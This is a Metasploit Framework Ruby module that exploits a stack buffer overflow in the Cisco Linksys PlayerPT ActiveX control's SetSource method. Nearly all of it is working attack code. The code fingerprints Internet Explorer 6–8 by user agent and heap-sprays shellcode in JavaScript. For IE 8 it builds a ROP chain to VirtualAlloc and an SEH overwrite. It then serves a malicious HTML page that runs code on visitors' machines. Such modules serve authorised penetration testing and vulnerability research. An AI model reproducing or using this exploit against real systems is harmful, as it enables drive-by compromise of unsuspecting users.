##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::Remote::Seh
	include Msf::Exploit::Remote::BrowserAutopwn

	autopwn_info({
		:ua_name    => HttpClients::IE,
		:ua_minver  => "6.0",
		:ua_maxver  => "8.0",
		:javascript => true,
		:os_name    => OperatingSystems::WINDOWS,
		:classid    => "{9E065E4A-BD9D-4547-8F90-985DC62A5591}",
		:method     => "SetSource",
		:rank       => NormalRanking
	})


	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Cisco Linksys PlayerPT ActiveX Control Buffer Overflow',
			'Description'    => %q{
					This module exploits a vulnerability found in Cisco Linksys PlayerPT 1.0.0.15
				as the installed with the web interface of Cisco Linksys WVC200 Wireless-G PTZ
				Internet Video Camera. The vulnerability, due to the insecure usage of sprintf in
				the SetSource method, allows to trigger a stack based buffer overflow which leads
				to code execution under the context of the user visiting a malicious web page.
			},
			'Author'         =>
				[
					'rgod', # Vulnerabilty Discovery and PoC
					'juan vazquez' # Metasploit module
					
				],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'OSVDB', '80297' ],
					[ 'BID', '54588' ],
					[ 'EDB', '18641' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',

				},
			'Payload'        =>
				{
					'Space' => 1024,
					'DisableNops' => true,
					'BadChars'    => "\x00\x0d\x0a\x5c",
					'PrependEncoder' => "\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500
				},
			'DefaultOptions'  =>
				{
					'InitialAutoRunScript' => 'migrate -f'
				},
			'Platform' => 'win',
			'Targets'        =>
				[
					# Cisco Linksys PlayerPT ActiveX Control 1.0.0.15
					[ 'Automatic', { } ],
					[
						'IE 6 on Windows XP SP3',
						{
							'Spray' => true,
							'SprayBlocks' => 0x185,
							'SprayOffset' => '0x0',
							'OffsetStackBottom' => 8556
						}
					],
					[
						'IE 7 on Windows XP SP3 / Windows Vista SP2',
						{
							'Spray' => true,
							'SprayBlocks' => 0x185,
							'SprayOffset' => '0x0',
							'OffsetStackBottom' => 3220
						}
					],
					[
						'IE 8 on Windows XP SP3',
						{
							'Spray' => false,
							'OffsetRop' => 160,
							'Offset' => 456,
							'Ret' => 0x1002c536, # ADD ESP,0A2C # RETN from PlayerPT.ocx
							'OffsetStackBottom' => 4108
						}
					]
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Mar 22 2012',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])
			], self.class
		)

	end

	def get_spray(t, js_code, js_nops)

		spray = <<-JS
		var heap_obj = new heapLib.ie(0x20000);
		var code = unescape("#{js_code}");
		var nops = unescape("#{js_nops}");

		while (nops.length < 0x80000) nops += nops;

		var offset = nops.substring(0, #{t['SprayOffset']});
		var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);

		while (shellcode.length < 0x40000) shellcode += shellcode;
		var block = shellcode.substring(0, (0x80000-6)/2);

		heap_obj.gc();
		for (var z=1; z < #{t['SprayBlocks']}; z++) {
			heap_obj.alloc(block);
		}

		JS

		return spray

	end

	# rop chain generated with mona.py
	def create_rop_chain()

		rop_gadgets =
			[
				0x77c2f271,	# POP EBP # RETN [msvcrt.dll]
				0x77c2f271,	# skip 4 bytes [msvcrt.dll]
				0x77c5335d,	# POP EBX # RETN [msvcrt.dll]
				0xffffffff,	#
				0x77c127e1,	# INC EBX # RETN [msvcrt.dll]
				0x77c127e1,	# INC EBX # RETN [msvcrt.dll]
				0x77c4e392,	# POP EAX # RETN [msvcrt.dll]
				0x2cfe1467,	# put delta into eax (-> put 0x00001000 into edx)
				0x77c4eb80,	# ADD EAX,75C13B66 # ADD EAX,5D40C033 # RETN [msvcrt.dll]
				0x77c58fbc,	# XCHG EAX,EDX # RETN [msvcrt.dll]
				0x77c34de1,	# POP EAX # RETN [msvcrt.dll]
				0x2cfe04a7,	# put delta into eax (-> put 0x00000040 into ecx)
				0x77c4eb80,	# ADD EAX,75C13B66 # ADD EAX,5D40C033 # RETN [msvcrt.dll]
				0x77c14001,	# XCHG EAX,ECX # RETN [msvcrt.dll]
				0x77c479e2,	# POP EDI # RETN [msvcrt.dll]
				0x77c39f92,	# RETN (ROP NOP) [msvcrt.dll]
				0x77c3b8ba,	# POP ESI # RETN [msvcrt.dll]
				0x77c2aacc,	# JMP [EAX] [msvcrt.dll]
				0x77c4e392,	# POP EAX # RETN [msvcrt.dll]
				0x77c1110c,	# ptr to &VirtualAlloc() [IAT msvcrt.dll]
				0x77c12df9,	# PUSHAD # RETN [msvcrt.dll]
				0x77c51025,	# ptr to 'push esp #  ret ' [msvcrt.dll]
			].pack("V*")

		return rop_gadgets
	end

	def get_payload(my_target)

		case my_target.name
		when /IE 6 on Windows XP SP3/
			my_payload = "\x0c" * my_target['OffsetStackBottom']
			return my_payload
		when /IE 7 on Windows XP SP3 \/ Windows Vista SP2/
			my_payload = "\x0c" * my_target['OffsetStackBottom']
			return my_payload
		when /IE 8 on Windows XP SP3/
			my_payload = rand_text_alpha(my_target['OffsetRop'])
			my_payload << create_rop_chain
			my_payload << make_nops(my_target['Offset'] - my_payload.length)
			my_payload << generate_seh_record(my_target.ret)
			my_payload << payload.encoded
			my_payload << rand_text_alpha(my_target['OffsetStackBottom'] - my_payload.length)
			return my_payload
		end

	end

	def get_target(agent)
		#If the user is already specified by the user, we'll just use that
		return target if target.name != 'Automatic'
		if agent =~ /NT 5\.1/ and agent =~ /MSIE 6/
			return targets[1] #IE 6 on Windows XP SP3
		elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 7/
			return targets[2] #IE 7 on Windows XP SP3
		elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 8/
			return targets[3] #IE 8 on Windows XP SP3
		elsif agent =~ /NT 6\.0/ and agent =~ /MSIE 7/
			return targets[2] #IE 7 on Windows Vista SP2
		else
			return nil
		end
	end

	def on_request_uri(cli, request)

		agent = request.headers['User-Agent']
		print_status("User-agent: #{agent}")

		my_target = get_target(agent)

		# Avoid the attack if the victim doesn't have a setup we're targeting
		if my_target.nil?
			print_error("Browser not supported: #{agent}")
			send_not_found(cli)
			return
		end

		js = ""

		if my_target['Spray']
			p = payload.encoded
			js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(my_target.arch))
			js_nops = Rex::Text.to_unescape("\x0c"*4, Rex::Arch.endian(my_target.arch))
			js = get_spray(my_target, js_code, js_nops)

			js = heaplib(js, {:noobfu => true})

			if datastore['OBFUSCATE']
				js = ::Rex::Exploitation::JSObfu.new(js)
				js.obfuscate
			end
		end

		sploit = get_payload(my_target)
		sploit = sploit.gsub(/"/, "\\\"")

		html = <<-MYHTML
		<html>
		<head>
		<script>
		#{js}
		</script>
		</head>
		<body>
		<object classid='clsid:9E065E4A-BD9D-4547-8F90-985DC62A5591' id='obj' /></object>
		<script>
			obj.SetSource("","","","","#{sploit}");
		</script>
		</body>
		</html>
		MYHTML

		html = html.gsub(/^\t\t/, '')

		print_status("Sending html")
		send_response(cli, html, {'Content-Type'=>'text/html'})
	end
end
